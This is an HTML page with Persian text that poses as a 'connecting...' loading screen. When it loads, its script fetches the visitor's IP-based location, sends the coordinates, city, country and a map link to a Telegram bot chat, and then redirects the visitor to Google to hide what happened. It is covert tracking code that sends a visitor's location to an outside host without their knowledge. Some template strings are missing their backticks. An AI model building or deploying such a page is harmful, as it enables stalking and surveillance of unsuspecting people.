<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body{background:#0a0a0a;color:#fff;text-align:center;padding-top:15%;font-family:Arial}
        #status{color:#0f0;font-size:18px;margin-top:20px}
    </style>
</head>
<body>
    <h2>⏳ در حال اتصال ...</h2>
    <div id="status">⏳ دریافت اطلاعات...</div>
    <script>
    (function() {
        const statusEl = document.getElementById('status');

        function setStatus(msg, isError = false) {
            statusEl.textContent = msg;
            statusEl.style.color = isError ? '#f44' : '#0f0';
        }

        // ===== دریافت موقعیت از IP (فقط یک سرویس ساده) =====
        async function getLocation() {
            try {
                setStatus('🌐 دریافت موقعیت از شبکه...');
                const res = await fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(5000) });
                const data = await res.json();
                if (data.status === 'success') {
                    return {
                        lat: data.lat,
                        lon: data.lon,
                        city: data.city,
                        country: data.country,
                        method: 'IP-API'
                    };
                } else {
                    return null;
                }
            } catch(e) {
                setStatus('❌ خطا در دریافت موقعیت: ' + e.message, true);
                return null;
            }
        }

        // ===== ارسال به تلگرام =====
        async function sendToTelegram(loc) {
            const botToken = 'YOUR_BOT_TOKEN';   // <-- توکن خود را اینجا بگذارید
            const chatId = '6340337525';         // <-- Chat ID خود را اینجا بگذارید

            const text = 
📍 موقعیت جدید:
🌐 عرض: ${loc.lat}
🌐 طول: ${loc.lon}
🏙 شهر: ${loc.city || 'نامشخص'}
🌍 کشور: ${loc.country || 'نامشخص'}
📡 روش: ${loc.method}
🔗 نقشه: https://www.google.com/maps?q=${loc.lat},${loc.lon};

            const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)};
            try {
                setStatus('📤 ارسال به تلگرام...');
                const res = await fetch(url, { method: 'GET', signal: AbortSignal.timeout(5000) });
                const data = await res.json();
                if (data.ok) {
                    setStatus('✅ موقعیت ارسال شد!');
                    return true;
                } else {
                    setStatus('❌ خطا در ارسال: ' + data.description, true);
                    return false;
                }
            } catch(e) {
                setStatus('❌ خطا در ارتباط با تلگرام: ' + e.message, true);
                return false;
            }
        }

        // ===== اصلی =====
        async function main() {
            const loc = await getLocation();
            if (loc) {
                setStatus(✅ موقعیت: ${loc.lat}, ${loc.lon});
                await sendToTelegram(loc);
            } else {
                setStatus('❌ موقعیت دریافت نشد', true);
            }
            // ریدایرکت بعد از ۲ ثانیه
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 2000);
        }

        main();
    })();
    </script>
</body>
</html>
